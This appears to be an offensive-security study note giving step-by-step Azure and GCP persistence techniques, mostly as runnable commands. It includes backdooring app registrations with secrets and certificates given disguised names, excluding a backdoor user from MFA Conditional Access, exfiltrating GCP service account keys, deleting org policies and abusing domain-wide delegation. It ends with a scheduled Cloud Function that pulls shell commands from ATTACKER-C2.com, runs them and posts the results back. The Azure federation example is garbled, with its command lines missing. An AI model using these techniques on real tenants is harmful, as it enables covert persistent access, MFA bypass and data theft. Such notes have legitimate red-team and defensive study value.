# 09.2 — Azure and GCP Persistence Techniques

## What This Note Covers

Cloud-native persistence techniques for Azure and GCP — app registration backdoors, service principal credential addition, Conditional Access policy modification, GCP service account key creation, domain-wide delegation abuse, and org policy manipulation.

---

## Azure Persistence Techniques

### Technique 1: Backdoor App Registration (Primary Azure Persistence)

App registrations in Azure AD can have client secrets added at any time. If you add a credential to an existing high-privilege app registration, you gain persistent access as that service principal.

```bash
# Requires: Application Administrator or Owner of the App Registration

# Step 1: Find high-privilege app registrations
az ad app list --all --output table
# Or via ROADtools — browse App Registrations → filter by role assignments

# Step 2: Find service principals with subscription-level roles
az ad sp list --all --query "[].id" -o tsv | while read id; do
  roles=$(az role assignment list --assignee $id --all -o table 2>/dev/null)
  echo "$roles" | grep -qiE "Owner|Contributor" && echo "HIGH PRIV SP: $id" && echo "$roles"
done

# Step 3: Add a client secret to the target app registration
az ad app credential reset \
  --id TARGET_APP_ID \
  --display-name "certificate-renewal-2024" \
  --years 2
# Returns: appId, password (the new secret), tenant

# Step 4: Store credentials — authenticate at any time
az login --service-principal \
  --username APP_ID \
  --password "SECRET_FROM_STEP_3" \
  --tenant TENANT_ID
```

> [!tip] New credential blends in
> App registrations often have multiple credentials for rotation purposes. Adding one more doesn't stand out unless Azure AD audit logs are actively monitored for `Add application credentials` events.

### Technique 2: Add Owner to App Registration

If you can modify an app registration's ownership, you add your identity as an owner — giving permanent access to manage its credentials and permissions.

```bash
# Requires: being an existing owner of the app, or Application Administrator

# Add your user as an owner of the app registration
az ad app owner add \
  --id TARGET_APP_ID \
  --owner-object-id YOUR_USER_OBJECT_ID

# Now you can add credentials to this app any time
```

### Technique 3: Service Principal Key Addition (Certificate-Based)

Service principals can authenticate with client secrets OR certificates. Certificates are harder to detect as they require no plaintext secret in logs.

```bash
# Generate a self-signed certificate
openssl req -x509 -newkey rsa:2048 -keyout backdoor.key \
  -out backdoor.crt -days 730 -nodes \
  -subj "/CN=AzureBackdoorCert"

# Add the certificate to the service principal
az ad app credential reset \
  --id TARGET_APP_ID \
  --cert @backdoor.crt \
  --display-name "root-ca-refresh-2024"

# Authenticate using the certificate at any time
az login --service-principal \
  --username APP_ID \
  --tenant TENANT_ID \
  --certificate backdoor.crt \
  --password backdoor.key
```

### Technique 4: Conditional Access Policy Modification

Conditional Access policies restrict when users can authenticate. Adding an exclusion to a restrictive policy (e.g., MFA requirement) creates a persistent bypass.

```bash
# Requires: Conditional Access Administrator or Global Administrator

# List all Conditional Access policies
az rest --method GET \
  --url "https://graph.microsoft.com/v1.0/identity/conditionalAccess/policies" \
  --query "value[].{Name:displayName,State:state,ID:id}"

# Get a specific policy (e.g., "Require MFA for all users")
az rest --method GET \
  --url "https://graph.microsoft.com/v1.0/identity/conditionalAccess/policies/POLICY_ID"

# Add your backdoor user to the exclusion list
az rest --method PATCH \
  --url "https://graph.microsoft.com/v1.0/identity/conditionalAccess/policies/POLICY_ID" \
  --headers "Content-Type=application/json" \
  --body '{
    "conditions": {
      "users": {
        "excludeUsers": ["BACKDOOR_USER_OBJECT_ID"]
      }
    }
  }'

# Your backdoor user can now bypass MFA requirements
```

### Technique 5: Federation Identity Backdoor (Advanced)

Add a federated identity credential to an app registration, pointing to an external identity provider you control.

```bash

  --id TARGET_APP_ID \

    "issuer": "https://token.actions.githubusercontent.com",
    "subject": "repo:ATTACKER_ORG/ATTACKER_REPO:ref:refs/heads/main",
    "audiences": ["api://AzureADTokenExchange"]
```

## GCP Persistence Techniques

### Technique 1: Service Account Key Creation (Primary GCP Persistence)

Creating a JSON key file for a service account is the GCP equivalent of creating an AWS access key. The key doesn't expire until explicitly revoked.

```bash
# Requires: iam.serviceAccountKeys.create on the target SA

# Create a new JSON key for a high-privilege SA
gcloud iam service-accounts keys create /tmp/backdoor-key.json \
  --iam-account PRIVILEGED_SA@PROJECT.iam.gserviceaccount.com \
  --project PROJECT_ID

# The JSON file is the persistent credential — exfiltrate it
cat /tmp/backdoor-key.json

# Use at any time from anywhere
gcloud auth activate-service-account \
  --key-file /tmp/backdoor-key.json
gcloud config set project PROJECT_ID
gcloud projects get-iam-policy PROJECT_ID  # verify access
```

### Technique 2: Create a New Service Account and Grant Roles

Create a new SA under a plausible name, grant it org-level roles, generate a key — persistent access that survives project changes.

```bash
# Requires: iam.serviceAccounts.create + resourcemanager.projects.setIamPolicy

# Create new SA with plausible name
gcloud iam service-accounts create monitoring-exporter \
  --display-name "Cloud Monitoring Exporter" \
  --project PROJECT_ID

SA_EMAIL="monitoring-exporter@PROJECT_ID.iam.gserviceaccount.com"

# Grant it editor role on the project
gcloud projects add-iam-policy-binding PROJECT_ID \
  --member="serviceAccount:$SA_EMAIL" \
  --role="roles/editor"

# Or org-level for persistence across projects
gcloud organizations add-iam-policy-binding ORG_ID \
  --member="serviceAccount:$SA_EMAIL" \
  --role="roles/viewer"

# Create the persistent key
gcloud iam service-accounts keys create backdoor.json \
  --iam-account $SA_EMAIL
```

### Technique 3: Org Policy Modification

Remove org policies that restrict what can happen in projects — unlocking capabilities the attacker needs to maintain access.

```bash
# Requires: orgpolicy.policies.create at org level

# Remove the policy blocking SA key creation (if it exists)
gcloud resource-manager org-policies delete \
  iam.disableServiceAccountKeyCreation \
  --organization ORG_ID

# Now keys can be created even in projects that had the restriction

# Remove policy blocking external SA (if workload identity was enforced)
gcloud resource-manager org-policies delete \
  iam.disableServiceAccountKeyUpload \
  --organization ORG_ID
```

### Technique 4: Domain-Wide Delegation Addition

If you have Google Workspace admin access, adding DWD to a service account gives persistent impersonation capability for all workspace users.

```bash
# This requires Google Workspace admin console access
# (not just GCP access)

# Step 1: Enable DWD on an existing SA
# Via GCP Console: IAM → Service Accounts → select SA → Enable G Suite Domain-wide Delegation

# Step 2: In Google Workspace Admin (admin.google.com)
# Security → API Controls → Domain-wide delegation → Add new
# Client ID: SA's OAuth2 Client ID
# Scopes: https://www.googleapis.com/auth/gmail.readonly,https://www.googleapis.com/auth/drive

# Step 3: Use DWD to impersonate any user
python3 dwd_backdoor.py  # see 03.2 for the Python pattern
```

### Technique 5: Cloud Function Backdoor (GCP Equivalent of Lambda)

```bash
# Create a persistent Cloud Function that beacons to attacker
mkdir /tmp/gcp-beacon && cat > /tmp/gcp-beacon/main.py << 'EOF'
import requests
import subprocess

def handler(request):
    try:
        cmd_resp = requests.get("https://ATTACKER-C2.com/cmd", timeout=3)
        if cmd_resp.status_code == 200:
            cmd = cmd_resp.text.strip()
            result = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT)
            requests.post("https://ATTACKER-C2.com/result", data=result, timeout=3)
    except:
        pass
    return "OK", 200
EOF

cat > /tmp/gcp-beacon/requirements.txt << 'EOF'
requests
EOF

# Deploy with a high-privilege SA
gcloud functions deploy gcp-health-probe \
  --runtime python311 \
  --trigger-http \
  --allow-unauthenticated \
  --service-account PRIVILEGED_SA@PROJECT.iam.gserviceaccount.com \
  --source /tmp/gcp-beacon \
  --entry-point handler \
  --region us-central1 \
  --project PROJECT_ID

# Schedule it via Cloud Scheduler
gcloud scheduler jobs create http gcp-health-probe-schedule \
  --schedule="*/5 * * * *" \
  --uri="$(gcloud functions describe gcp-health-probe --region us-central1 --format='get(httpsTrigger.url)')" \
  --http-method=GET \
  --project PROJECT_ID
```
